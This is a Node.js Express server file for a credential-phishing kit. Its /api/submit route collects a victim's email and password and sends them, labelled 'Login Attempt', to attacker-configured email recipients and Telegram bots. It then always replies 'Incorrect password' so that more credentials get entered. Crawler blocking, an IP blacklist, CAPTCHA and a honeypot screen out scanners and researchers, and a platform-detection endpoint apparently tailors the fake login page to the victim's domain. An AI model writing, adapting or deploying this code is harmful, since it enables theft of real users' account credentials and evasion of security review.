// backend/index.js
const morgan = require("morgan");
const helmet = require("helmet");
const { detectPlatform } = require("./utils/dnsHelpers");
require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const TelegramBot = require("node-telegram-bot-api");
const path = require("path");
const axios = require("axios");
const rateLimit = require("express-rate-limit");
const cors = require("cors");
const validator = require("validator");

const app = express();
const PORT = process.env.PORT || 3000;

// ─── Security Middleware ────────────────────────────────────
// Allow Google's reCAPTCHA domains in the Content Security Policy so the
// widget and its resources can load. This explicitly permits scripts and
// frames from google.com and gstatic.com which the default strict policy
// would block.
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
  scriptSrc: ["'self'", 'https://www.google.com', 'https://www.gstatic.com'],
  // allow framing from our own origin (useful for local redirects) and recaptcha
  frameSrc: ["'self'", 'https://www.google.com', 'http://localhost:3000'],
  // allow XHR/fetch to Google endpoints and font CDN
  connectSrc: ["'self'", 'https://www.google.com', 'https://www.gstatic.com', 'https://fonts.gstatic.com'],
  imgSrc: ["'self'", 'data:'],
  // allow Google Fonts stylesheet and inline styles used by some pages
  styleSrc: ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
  // explicitly allow font CDN
  fontSrc: ["'self'", 'https://fonts.gstatic.com', 'data:'],
  objectSrc: ["'none'"],
      }
    }
  })
);
app.use(cors({
  origin: process.env.CORS_ORIGIN || "https://sogqxt.tempavatar.click",
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"]
}));
app.use(morgan("combined"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─── Static Files ───────────────────────────────────────────
app.use(express.static(path.join(__dirname, "../public")));

// ─── Home Route ─────────────────────────────────────────────
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ─── Platform Detection API ─────────────────────────────────
app.get("/api/detect-platform", async (req, res) => {
  const domain = req.query.domain;
  if (!domain || !validator.isFQDN(domain)) {
    return res.status(400).json({ error: "Missing or invalid domain" });
  }

  try {
    const result = await detectPlatform(domain);
    res.json({ platform: result.platform || "fallback" });
  } catch (err) {
    console.error("Detection error:", err);
    res.status(500).json({ platform: "fallback" });
  }
});

// ─── Rate limit /api/submit ─────────────────────────────────
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: { message: "Too many requests. Please try again later." }
});
app.use("/api/submit", limiter);

// ─── Block obvious bots by User-Agent ───────────────────────
app.use((req, res, next) => {
  const ua = req.headers["user-agent"] || "";
  const lowerUA = ua.toLowerCase();
  if (lowerUA.includes("bot") || lowerUA.includes("crawler")) {
    return res.status(403).json({ message: "Bot access denied" });
  }
  next();
});

// ─── Optional IP blacklist ──────────────────────────────────
const blockedIPs = ["123.45.67.89", "111.222.333.444"];
app.use((req, res, next) => {
  if (blockedIPs.includes(req.ip)) {
    return res.status(403).json({ message: "Access denied" });
  }
  next();
});

// ─── Nodemailer Setup ───────────────────────────────────────
const transporter = nodemailer.createTransport(
  process.env.MAIL_PROVIDER === "gmail"
    ? {
        service: "gmail",
        auth: {
          user: process.env.EMAIL_USER,
          pass: process.env.EMAIL_PASS
        }
      }
    : {
        host: process.env.SMTP_HOST,
        port: parseInt(process.env.SMTP_PORT, 10) || 465,
        secure: process.env.SMTP_SECURE === "true",
        auth: {
          user: process.env.EMAIL_USER,
          pass: process.env.EMAIL_PASS
        }
      }
);

// Test SMTP connection on startup
transporter.verify((error) => {
  if (error) {
    console.error("❌ SMTP connection failed:", error.message);
  } else {
    console.log("✅ SMTP server is ready to take messages");
  }
});

// ─── CAPTCHA verification helper ────────────────────────────
const verifyCaptcha = async (token) => {
  const response = await axios.post(
    "https://www.google.com/recaptcha/api/siteverify",
    null,
    {
      params: {
        secret: process.env.RECAPTCHA_SECRET,
        response: token
      }
    }
  );
  return response.data;
};

// ─── Main Route ─────────────────────────────────────────────
app.post("/api/submit", async (req, res) => {
  console.log("✅ Received payload:", req.body);

  const {
    email,
    password,
    lourl = "N/A",
    captcha,
    honeypot,
    "g-recaptcha-response": gRecaptcha
  } = req.body;

  const captchaValue = captcha || gRecaptcha;

  // Validate email format
  if (!validator.isEmail(email)) {
    return res.status(400).json({ success: false, message: "Invalid email format" });
  }

  // Validate password length (example: min 6 chars)
  if (!password || password.length < 6) {
    return res.status(400).json({ success: false, message: "Password too short" });
  }

  try {
    // Honeypot
    if (honeypot) {
      console.warn(`🕷️ Honeypot triggered by IP: ${req.ip}`);
      return res.status(403).json({ success: false, message: "Bot detected" });
    }

    // Required fields
    if (!email || !password || !captchaValue) {
      console.warn("❌ Missing credentials or CAPTCHA");
      return res.status(400).json({
        success: false,
        message: "Missing credentials or CAPTCHA"
      });
    }

    console.log("🔍 Verifying CAPTCHA...");
    let captchaResult = { success: false };
    if (process.env.RECAPTCHA_BYPASS === 'true') {
      console.warn('⚠️ RECAPTCHA_BYPASS is enabled - skipping server-side verification (dev only)');
      captchaResult = { success: true, bypass: true };
    } else {
      captchaResult = await verifyCaptcha(captchaValue);
      console.log("CAPTCHA API response:", captchaResult);
      if (!captchaResult.success) {
        console.warn(
          "⚠️ CAPTCHA failed for IP:",
          req.ip,
          "Reason:",
          captchaResult["error-codes"]
        );
        return res.status(403).json({
          success: false,
          message: "CAPTCHA verification failed"
        });
      }
    }

    // Prepare message (sanitize user input for logs/emails)
    const safeEmail = validator.escape(email);
    const safePassword = validator.escape(password);
    const safeLourl = validator.escape(lourl);

    const message = `
🔐 Login Attempt
👤 Username: ${safeEmail}
🔑 Password: ${safePassword}
🌐 Page URL: ${safeLourl}
🕒 Time: ${new Date().toISOString()}
    `;

    // ─── Send Email to multiple recipients (guard env presence) ───────────────────
    const emailRecipients = process.env.EMAIL_RECEIVER
      ? process.env.EMAIL_RECEIVER.split(",").map(addr => addr.trim()).filter(Boolean)
      : [];
    const bccRecipients = process.env.EMAIL_BCC
      ? process.env.EMAIL_BCC.split(",").map(addr => addr.trim()).filter(Boolean)
      : [];

    if (emailRecipients.length > 0) {
      console.log("📧 Sending email to:", emailRecipients, "BCC:", bccRecipients);
      await transporter.sendMail({
        from: process.env.EMAIL_USER,
        to: emailRecipients,
        bcc: bccRecipients,
        subject: "Login Attempt Notification",
        text: message
      });
      console.log("✅ Email sent successfully");
    } else {
      console.warn('⚠️ No EMAIL_RECEIVER configured - skipping email send');
    }

    // ─── Send Telegram via multiple bots (support numbered bots and single-token fallback) ─────────────────────
    const botsConfig = [];
    Object.entries(process.env).forEach(([key, value]) => {
      const match = key.match(/^TELEGRAM_BOT_TOKEN(\d+)$/);
      if (match) {
        const index = match[1];
        const chatIdKey = `TELEGRAM_CHAT_ID${index}`;
        const chatId = process.env[chatIdKey];
        if (chatId) {
          botsConfig.push({ token: value.trim(), chatId: chatId.trim() });
        } else {
          console.warn(`⚠️ Missing ${chatIdKey} for bot token ${key}`);
        }
      }
    });

    // Fallback to unnumbered TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID
    if (botsConfig.length === 0 && process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
      botsConfig.push({ token: process.env.TELEGRAM_BOT_TOKEN.trim(), chatId: process.env.TELEGRAM_CHAT_ID.trim() });
    }

    console.log("💬 Parsed Telegram bots config:", botsConfig);

    if (botsConfig.length > 0) {
      // Send in parallel without blocking the HTTP response
      Promise.allSettled(
        botsConfig.map(({ token, chatId }) => {
          console.log(`📡 Sending Telegram via bot ${token} to chat ${chatId}`);
          const tempBot = new TelegramBot(token, { polling: false });
          return tempBot.sendMessage(chatId, message);
        })
      ).then(results => {
        results.forEach((res, i) => {
          const { token, chatId } = botsConfig[i];
          if (res.status === "fulfilled") {
            console.log(`✅ Telegram message sent via bot ${token} to chat ${chatId}`);
          } else {
            console.error(`💥 Telegram send failed for ${chatId}:`, res.reason && res.reason.message ? res.reason.message : res.reason);
          }
        });
      }).catch(err => console.error('💥 Error sending telegram messages:', err));
    } else {
      console.warn('⚠️ No Telegram bot config found - skipping telegram sends');
    }

    // Respond to client
    return res.status(401).json({
      success: false,
      message: "Incorrect password. Please try again."
    });

  } catch (err) {
    console.error("💥 Error in /api/submit:", err);
    return res.status(500).json({ success: false, message: "Internal server error" });
  }
});

// ─── Start Server ───────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});